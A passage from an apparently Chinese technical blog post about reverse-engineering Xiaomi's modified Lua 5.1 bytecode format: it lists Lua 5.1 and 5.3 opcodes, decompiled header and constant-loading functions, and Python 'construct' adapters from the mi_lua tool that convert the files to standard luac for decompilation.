class="line">OP_SUB,<span class="comment">/*A B CR(A) := RK(B) - RK(C)*/</span></span><br><span class="line">OP_MUL,<span class="comment">/*A B CR(A) := RK(B) * RK(C)*/</span></span><br><span class="line">OP_DIV,<span class="comment">/*A B CR(A) := RK(B) / RK(C)*/</span></span><br><span class="line">OP_MOD,<span class="comment">/*A B CR(A) := RK(B) % RK(C)*/</span></span><br><span class="line">OP_POW,<span class="comment">/*A B CR(A) := RK(B) ^ RK(C)*/</span></span><br><span class="line">OP_UNM,<span class="comment">/*A BR(A) := -R(B)*/</span></span><br><span class="line">OP_NOT,<span class="comment">/*A BR(A) := not R(B)*/</span></span><br><span class="line">OP_LEN,<span class="comment">/*A BR(A) := length of R(B)*/</span></span><br><span class="line"></span><br><span class="line">OP_CONCAT,<span class="comment">/*A B CR(A) := R(B).. ... ..R(C)*/</span></span><br><span class="line"></span><br><span class="line">OP_JMP,<span class="comment">/*sBxpc+=sBx*/</span></span><br><span class="line"></span><br><span class="line">OP_EQ,<span class="comment">/*A B Cif ((RK(B) == RK(C)) ~= A) then pc++*/</span></span><br><span class="line">OP_LT,<span class="comment">/*A B Cif ((RK(B) &lt;  RK(C)) ~= A) then pc++  */</span></span><br><span class="line">OP_LE,<span class="comment">/*A B Cif ((RK(B) &lt;= RK(C)) ~= A) then pc++  */</span></span><br><span class="line"></span><br><span class="line">OP_TEST,<span class="comment">/*A Cif not (R(A) &lt;=&gt; C) then pc++*/</span> </span><br><span class="line">OP_TESTSET,<span class="comment">/*A B Cif (R(B) &lt;=&gt; C) then R(A) := R(B) else pc++*/</span> </span><br><span class="line"></span><br><span class="line">OP_CALL,<span class="comment">/*A B CR(A), ... ,R(A+C-2) := R(A)(R(A+1), ... ,R(A+B-1)) */</span></span><br><span class="line">OP_TAILCALL,<span class="comment">/*A B Creturn R(A)(R(A+1), ... ,R(A+B-1))*/</span></span><br><span class="line">OP_RETURN,<span class="comment">/*A Breturn R(A), ... ,R(A+B-2)(see note)*/</span></span><br><span class="line"></span><br><span class="line">OP_FORLOOP,<span class="comment">/*A sBxR(A)+=R(A+2);</span></span><br><span class="line"><span class="comment">if R(A) &lt;?= R(A+1) then &#123; pc+=sBx; R(A+3)=R(A) &#125;*/</span></span><br><span class="line">OP_FORPREP,<span class="comment">/*A sBxR(A)-=R(A+2); pc+=sBx*/</span></span><br><span class="line"></span><br><span class="line">OP_TFORLOOP,<span class="comment">/*A CR(A+3), ... ,R(A+2+C) := R(A)(R(A+1), R(A+2)); </span></span><br><span class="line"><span class="comment">                        if R(A+3) ~= nil then R(A+2)=R(A+3) else pc++*/</span> </span><br><span class="line">OP_SETLIST,<span class="comment">/*A B CR(A)[(C-1)*FPF+i] := R(A+i), 1 &lt;= i &lt;= B*/</span></span><br><span class="line"></span><br><span class="line">OP_CLOSE,<span class="comment">/*A close all variables in the stack up to (&gt;=) R(A)*/</span></span><br><span class="line">OP_CLOSURE,<span class="comment">/*A BxR(A) := closure(KPROTO[Bx], R(A), ... ,R(A+n))*/</span></span><br><span class="line"></span><br><span class="line">OP_VARARG<span class="comment">/*A BR(A), R(A+1), ..., R(A+B-1) = vararg*/</span></span><br><span class="line">&#125; OpCode;</span><br></pre></td></tr></table></figure><h5 id="5-3-1"><a href="#5-3-1" class="headerlink" title="5.3"></a>5.3</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">nameargsdescription</span></span><br><span class="line"><span class="comment">------------------------------------------------------------------------*/</span></span><br><span class="line">OP_MOVE,<span class="comment">/*A BR(A) := R(B)*/</span></span><br><span class="line">OP_LOADK,<span class="comment">/*A BxR(A) := Kst(Bx)*/</span></span><br><span class="line">OP_LOADKX,<span class="comment">/*A R(A) := Kst(extra arg)*/</span></span><br><span class="line">OP_LOADBOOL,<span class="comment">/*A B CR(A) := (Bool)B; if (C) pc++*/</span></span><br><span class="line">OP_LOADNIL,<span class="comment">/*A BR(A), R(A+1), ..., R(A+B) := nil*/</span></span><br><span class="line">OP_GETUPVAL,<span class="comment">/*A BR(A) := UpValue[B]*/</span></span><br><span class="line"></span><br><span class="line">OP_GETTABUP,<span class="comment">/*A B CR(A) := UpValue[B][RK(C)]*/</span></span><br><span class="line">OP_GETTABLE,<span class="comment">/*A B CR(A) := R(B)[RK(C)]*/</span></span><br><span class="line"></span><br><span class="line">OP_SETTABUP,<span class="comment">/*A B CUpValue[A][RK(B)] := RK(C)*/</span></span><br><span class="line">OP_SETUPVAL,<span class="comment">/*A BUpValue[B] := R(A)*/</span></span><br><span class="line">OP_SETTABLE,<span class="comment">/*A B CR(A)[RK(B)] := RK(C)*/</span></span><br><span class="line"></span><br><span class="line">OP_NEWTABLE,<span class="comment">/*A B CR(A) := &#123;&#125; (size = B,C)*/</span></span><br><span class="line"></span><br><span class="line">OP_SELF,<span class="comment">/*A B CR(A+1) := R(B); R(A) := R(B)[RK(C)]*/</span></span><br><span class="line"></span><br><span class="line">OP_ADD,<span class="comment">/*A B CR(A) := RK(B) + RK(C)*/</span></span><br><span class="line">OP_SUB,<span class="comment">/*A B CR(A) := RK(B) - RK(C)*/</span></span><br><span class="line">OP_MUL,<span class="comment">/*A B CR(A) := RK(B) * RK(C)*/</span></span><br><span class="line">OP_MOD,<span class="comment">/*A B CR(A) := RK(B) % RK(C)*/</span></span><br><span class="line">OP_POW,<span class="comment">/*A B CR(A) := RK(B) ^ RK(C)*/</span></span><br><span class="line">OP_DIV,<span class="comment">/*A B CR(A) := RK(B) / RK(C)*/</span></span><br><span class="line">OP_IDIV,<span class="comment">/*A B CR(A) := RK(B) // RK(C)*/</span></span><br><span class="line">OP_BAND,<span class="comment">/*A B CR(A) := RK(B) &amp; RK(C)*/</span></span><br><span class="line">OP_BOR,<span class="comment">/*A B CR(A) := RK(B) | RK(C)*/</span></span><br><span class="line">OP_BXOR,<span class="comment">/*A B CR(A) := RK(B) ~ RK(C)*/</span></span><br><span class="line">OP_SHL,<span class="comment">/*A B CR(A) := RK(B) &lt;&lt; RK(C)*/</span></span><br><span class="line">OP_SHR,<span class="comment">/*A B CR(A) := RK(B) &gt;&gt; RK(C)*/</span></span><br><span class="line">OP_UNM,<span class="comment">/*A BR(A) := -R(B)*/</span></span><br><span class="line">OP_BNOT,<span class="comment">/*A BR(A) := ~R(B)*/</span></span><br><span class="line">OP_NOT,<span class="comment">/*A BR(A) := not R(B)*/</span></span><br><span class="line">OP_LEN,<span class="comment">/*A BR(A) := length of R(B)*/</span></span><br><span class="line"></span><br><span class="line">OP_CONCAT,<span class="comment">/*A B CR(A) := R(B).. ... ..R(C)*/</span></span><br><span class="line"></span><br><span class="line">OP_JMP,<span class="comment">/*A sBxpc+=sBx; if (A) close all upvalues &gt;= R(A - 1)*/</span></span><br><span class="line">OP_EQ,<span class="comment">/*A B Cif ((RK(B) == RK(C)) ~= A) then pc++*/</span></span><br><span class="line">OP_LT,<span class="comment">/*A B Cif ((RK(B) &lt;  RK(C)) ~= A) then pc++*/</span></span><br><span class="line">OP_LE,<span class="comment">/*A B Cif ((RK(B) &lt;= RK(C)) ~= A) then pc++*/</span></span><br><span class="line"></span><br><span class="line">OP_TEST,<span class="comment">/*A Cif not (R(A) &lt;=&gt; C) then pc++*/</span></span><br><span class="line">OP_TESTSET,<span class="comment">/*A B Cif (R(B) &lt;=&gt; C) then R(A) := R(B) else pc++*/</span></span><br><span class="line"></span><br><span class="line">OP_CALL,<span class="comment">/*A B CR(A), ... ,R(A+C-2) := R(A)(R(A+1), ... ,R(A+B-1)) */</span></span><br><span class="line">OP_TAILCALL,<span class="comment">/*A B Creturn R(A)(R(A+1), ... ,R(A+B-1))*/</span></span><br><span class="line">OP_RETURN,<span class="comment">/*A Breturn R(A), ... ,R(A+B-2)(see note)*/</span></span><br><span class="line"></span><br><span class="line">OP_FORLOOP,<span class="comment">/*A sBxR(A)+=R(A+2);</span></span><br><span class="line"><span class="comment">if R(A) &lt;?= R(A+1) then &#123; pc+=sBx; R(A+3)=R(A) &#125;*/</span></span><br><span class="line">OP_FORPREP,<span class="comment">/*A sBxR(A)-=R(A+2); pc+=sBx*/</span></span><br><span class="line"></span><br><span class="line">OP_TFORCALL,<span class="comment">/*A CR(A+3), ... ,R(A+2+C) := R(A)(R(A+1), R(A+2));*/</span></span><br><span class="line">OP_TFORLOOP,<span class="comment">/*A sBxif R(A+1) ~= nil then &#123; R(A)=R(A+1); pc += sBx &#125;*/</span></span><br><span class="line"></span><br><span class="line">OP_SETLIST,<span class="comment">/*A B CR(A)[(C-1)*FPF+i] := R(A+i), 1 &lt;= i &lt;= B*/</span></span><br><span class="line"></span><br><span class="line">OP_CLOSURE,<span class="comment">/*A BxR(A) := closure(KPROTO[Bx])*/</span></span><br><span class="line"></span><br><span class="line">OP_VARARG,<span class="comment">/*A BR(A), R(A+1), ..., R(A+B-2) = vararg*/</span></span><br><span class="line"></span><br><span class="line">OP_EXTRAARG<span class="comment">/*Axextra (larger) argument for previous opcode*/</span></span><br><span class="line">&#125; OpCode;</span><br></pre></td></tr></table></figure><h1 id="mi-lua"><a href="#mi-lua" class="headerlink" title="mi_lua"></a>mi_lua</h1><p>在github中找到了不少unluac的项目,但大多数都是java编写而成,不过学长提到的<a href="https://github.com/zh-explorer/mi_lua/">zh-explorer/mi_lua: xiaomi lua anti (github.com)</a></p><p>利用python的constrcut包构建与luac文件等价的结构体</p><p>将魔改后的luac文件先parse为中间结构体(既不是完全与mogailuac等价的luac,也不是标准的luac),然后再通过该结构体build为标准的luac</p><p>最后通过调用外部unluac对其进行还原可读格式</p><h2 id="xiaomi"><a href="#xiaomi" class="headerlink" title="xiaomi"></a>xiaomi</h2><p>尝试恢复小米的luac文件,小米的lua版本是lua5.1</p><p>ida静态加载lua,按照前面的分析发现<code>luaL_loadfile</code>是个导入符号,grep搜索,可以知道这个符号来自<code>liblua.so.5.1.5</code></p><p>在顺着路线向下分析到达关键的<code>luaU_undump</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_11350</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">const</span> <span class="type">char</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">5</span>]; <span class="comment">// [sp+0h] [bp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">10</span>]; <span class="comment">// [sp+14h] [bp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v12; <span class="comment">// [sp+1Eh] [bp-32h]</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">10</span>]; <span class="comment">// [sp+24h] [bp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [sp+2Eh] [bp-22h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+34h] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v15 = *(_DWORD *)off_2FFE8;</span><br><span class="line">  v5 = *(<span class="type">unsigned</span> __int8 *)a4;</span><br><span class="line">  v6 = v5 == <span class="number">61</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">61</span> )</span><br><span class="line">    v6 = v5 == <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    ++a4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">27</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a4 = <span class="string">&quot;binary string&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v10[<span class="number">3</span>] = (<span class="type">int</span>)a4;</span><br><span class="line">  v10[<span class="number">0</span>] = a1;</span><br><span class="line">  v10[<span class="number">1</span>] = a2;</span><br><span class="line">  v10[<span class="number">2</span>] = a3;</span><br><span class="line">  sub_112B8(v11);</span><br><span class="line">  sub_10A90(v10, v13, <span class="number">16</span>);</span><br><span class="line">  v7 = v14;</span><br><span class="line">  v14 = v12;</span><br><span class="line">  v10[<span class="number">4</span>] = v7 != v12;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v11, v13, <span class="number">16</span>) )</span><br><span class="line">    sub_10A5C(v10, <span class="string">&quot;bad header&quot;</span>);</span><br><span class="line">  v8 = luaS_newlstr(a1, <span class="string">&quot;=?&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_10D7C(v10, v8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="handle-header"><a href="#handle-header" class="headerlink" title="handle_header"></a>handle_header</h3><p>通过下面这个函数我们可以知道header信息,可以大致判断小米修改了标识头,并且size_size_t变为了4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_112B8</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  BOOL v1; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; <span class="string">&quot;\x1BFate/Z\x1B&quot;</span> &amp;&amp; a1 + <span class="number">8</span> &gt; <span class="string">&quot;\x1BFate/Z\x1B&quot;</span> )</span><br><span class="line">    __und(<span class="number">0</span>);</span><br><span class="line">  v1 = a1 &lt; <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="string">&quot;\x1BFate/Z\x1B&quot;</span> )</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    __und(<span class="number">0</span>);</span><br><span class="line">  result = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">memcpy</span>)();</span><br><span class="line">  a1[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">8</span>] = <span class="number">0x51</span>;</span><br><span class="line">  a1[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">  a1[<span class="number">14</span>] = <span class="number">8</span>;</span><br><span class="line">  a1[<span class="number">11</span>] = <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">12</span>] = <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">13</span>] = <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">15</span>] = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在脚本中的处理是,更改结构体定义</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GlobalHead = Struct(</span><br><span class="line">    <span class="string">&quot;signature&quot;</span> / Const(<span class="string">b&quot;\x1bFate/Z\x1b&quot;</span>),</span><br><span class="line">    <span class="string">&quot;version&quot;</span> / Version,</span><br><span class="line">    <span class="string">&quot;format&quot;</span> / Format,</span><br><span class="line">    <span class="string">&quot;endian&quot;</span> / Endian,</span><br><span class="line">    <span class="string">&quot;size_int&quot;</span> / Int8ul,</span><br><span class="line">    <span class="string">&quot;size_size_t&quot;</span> / Int8ul,</span><br><span class="line">    <span class="string">&quot;size_instruction&quot;</span> / Int8ul,</span><br><span class="line">    <span class="string">&quot;size_lua_number&quot;</span> / Int8ul,</span><br><span class="line">    <span class="string">&quot;lua_num_valid&quot;</span> / Byte</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>同时能够通过如下函数延迟绑定动态决定相关数据大小</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lua_type_define</span>(<span class="params">head</span>):</span><br><span class="line">    <span class="keyword">global</span> LuaInstruction, LuaInt, LuaNumber, LuaSize_t</span><br><span class="line">    <span class="keyword">if</span> head.size_int == <span class="number">4</span>:</span><br><span class="line">        LuaInt = Int32sl</span><br><span class="line">    <span class="keyword">elif</span> head.size_int == <span class="number">8</span>:</span><br><span class="line">        LuaInt = Int64sl</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LuaDecodeException(<span class="string">&quot;Unsupported size int&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head.size_size_t == <span class="number">4</span>:</span><br><span class="line">        LuaSize_t = Int32ul</span><br><span class="line">    <span class="keyword">elif</span> head.size_size_t == <span class="number">8</span>:</span><br><span class="line">        LuaSize_t = Int64ul</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LuaDecodeException(<span class="string">&quot;Unsupported size int&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head.size_lua_number == <span class="number">8</span>:</span><br><span class="line">        LuaNumber = Double</span><br><span class="line">    <span class="keyword">elif</span> head.size_lua_number == <span class="number">4</span>:</span><br><span class="line">        LuaNumber = Single</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LuaDecodeException(<span class="string">&quot;Unsupported size int&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head.size_instruction == <span class="number">4</span>:</span><br><span class="line">        LuaInstruction = Int32ul</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LuaDecodeException(<span class="string">&quot;Unsupported size int&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="handle-constans"><a href="#handle-constans" class="headerlink" title="handle_constans"></a>handle_constans</h3><p>接着进入Functioin的加载部分,主要关注switch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">switch</span> ( sub_10BEC(a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v42 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v43 = sub_10BEC(a1);</span><br><span class="line">        v42 = <span class="number">1</span>;</span><br><span class="line">        *(_DWORD *)(v40 + <span class="number">16</span> * i) = v43 != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        sub_10AC0(a1, &amp;v53, <span class="number">1</span>, <span class="number">8</span>, v52);</span><br><span class="line">        *(_QWORD *)v41 = v53;</span><br><span class="line">        v42 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        *(_DWORD *)(v40 + <span class="number">16</span> * i) = sub_10CB8(a1);</span><br><span class="line">        *(_DWORD *)(v41 + <span class="number">8</span>) = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        sub_10AC0(a1, &amp;v53, <span class="number">1</span>, <span class="number">4</span>, v52);</span><br><span class="line">        *(_DWORD *)(v40 + <span class="number">16</span> * i) = v53;</span><br><span class="line">        v42 = <span class="number">9</span>;</span><br><span class="line">LABEL_43:</span><br><span class="line">        *(_DWORD *)(v41 + <span class="number">8</span>) = v42;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_10A5C(a1, <span class="string">&quot;bad constant&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过比较操作的代码,可以知道小米只是将常量加了偏移3,但可以发现xiaomi多了一种常量处理,虽然不知道其是什么类型,但可以知道其是4字节大小</p><p>所以需要额外添加一个常量(这并不一定能够成功),然后因为不好分析其具体类型,就只能当作number来处理,并且数据经过尝试应该要是为float</p><p>偏移则通过解码时减去3处理,添加一种数据类型</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LuaDatatype = Enum(Byte,</span><br><span class="line">                   LUA_TNIL=<span class="number">0</span>,</span><br><span class="line">                   LUA_TBOOLEAN=<span class="number">1</span>,</span><br><span class="line">                   LUA_TLIGHTUSERDATA=<span class="number">2</span>,</span><br><span class="line">                   LUA_TNUMBER=<span class="number">3</span>,</span><br><span class="line">                   LUA_TSTRING=<span class="number">4</span>,</span><br><span class="line">                   LUA_TTABLE=<span class="number">5</span>,</span><br><span class="line">                   LUA_TFUNCTION=<span class="number">6</span>,</span><br><span class="line">                   LUA_TUSERDATA=<span class="number">7</span>,</span><br><span class="line">                   LUA_TTHREAD=<span class="number">8</span>,</span><br><span class="line">                   LUA_MIDATA=<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LuaDatatypeAdapter</span>(<span class="title class_ inherited__">Adapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_decode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">if</span> obj == <span class="number">12</span>:</span><br><span class="line">            logging.warning(<span class="string">&quot;translate may not success&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> LuaDatatype.parse(<span class="built_in">bytes</span>([obj - <span class="number">3</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([<span class="built_in">int</span>(obj) + <span class="number">3</span>])</span><br></pre></td></tr></table></figure><p>然后数据类型解析增加对应情况</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Constant = ConstantAdapter(Struct(</span><br><span class="line">    <span class="string">&quot;data_type&quot;</span> / LuaDatatypeAdapter(Byte),</span><br><span class="line">    <span class="string">&quot;data&quot;</span> / Switch(this.data_type,</span><br><span class="line">                    &#123;<span class="string">&quot;LUA_TNIL&quot;</span>: Pass, <span class="string">&quot;LUA_TBOOLEAN&quot;</span>: Flag,</span><br><span class="line">                     <span class="string">&quot;LUA_TNUMBER&quot;</span>: LazyBound(<span class="keyword">lambda</span>: LuaNumber), <span class="string">&quot;LUA_TSTRING&quot;</span>: String, <span class="string">&quot;LUA_MIDATA&quot;</span>: Int32ul&#125;)</span><br></pre></td></tr></table></figure><p>最后添加的数据类型还是按照处理数字类型的处理,但是数据转换为float</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ConstantAdapter</span>(<span class="title class_ inherited__">Adapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_decode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(obj.data_type) == <span class="number">9</span>:</span><br><span class="line">            obj.data_type = LuaDatatype.parse(<span class="string">b&#x27;\x03&#x27;</span>)</span><br><span class="line">            obj.data = <span class="built_in">float</span>(obj.data)</span><br><span class="line">        <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure><h4 id="handle-string"><a href="#handle-string" class="headerlink" title="handle_string"></a>handle_string</h4><p>继续通过观察xiaomi的十六进制数据,可以发现其中几乎没有明文字符串,但正常luac是能够找到一些明文的,所以猜测xiaomi还对字符串进行了加密</p><p>进入字符串获取的处理函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 